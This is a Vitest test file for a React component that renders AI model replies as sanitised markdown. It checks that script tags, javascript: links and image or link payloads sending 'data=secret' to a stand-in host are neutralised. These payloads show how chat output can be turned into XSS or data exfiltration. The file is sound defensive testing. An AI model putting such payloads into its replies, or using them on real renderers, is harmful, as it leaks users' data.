import { expect, test } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import { SafeMarkdown } from "./SafeMarkdown";
test("模型回复的 HTML 与脚本 URL 不形成可执行内容", () => {
  const html = renderToStaticMarkup(
    <SafeMarkdown>
      {
        '<script>alert(1)</script>\n\n[危险](javascript:alert(1))\n\n```js\nconsole.log("你好")\n```'
      }
    </SafeMarkdown>,
  );
  expect(html).not.toContain("<script>");
  expect(html).not.toContain('href="javascript:');
  expect(html).toContain('<pre><code class="language-js">');
});

test.each([
  "![资料](https://example.invalid/collect?data=secret)",
  "![资料](//example.invalid/collect?data=secret)",
  "![资料](data:image/svg+xml;base64,PHN2Zz4=)",
  "[点击验证](https://example.invalid/collect?data=secret)",
  "<https://example.invalid/collect?data=secret>",
  '<img src="https://example.invalid/collect?data=secret">',
])("回复不得创建图片请求或可执行外链：%s", (text) => {
  const html = renderToStaticMarkup(<SafeMarkdown>{text}</SafeMarkdown>);
  expect(html).not.toContain("<img");
  expect(html).not.toContain("<a ");
  expect(html).not.toContain('src="');
  expect(html).not.toContain('href="');
});

test("安全渲染保留普通表格、列表、代码与引用文本", () => {
  const html = renderToStaticMarkup(
    <SafeMarkdown>
      {
        "| 列 | 值 |\n| --- | --- |\n| 结果 | 1 |\n\n- 要点 [S1]\n\n```python\nprint(1)\n```"
      }
    </SafeMarkdown>,
  );
  expect(html).toContain("<table>");
  expect(html).toContain("<li>");
  expect(html).toContain("[S1]");
  expect(html).toContain('<pre><code class="language-python">');
});
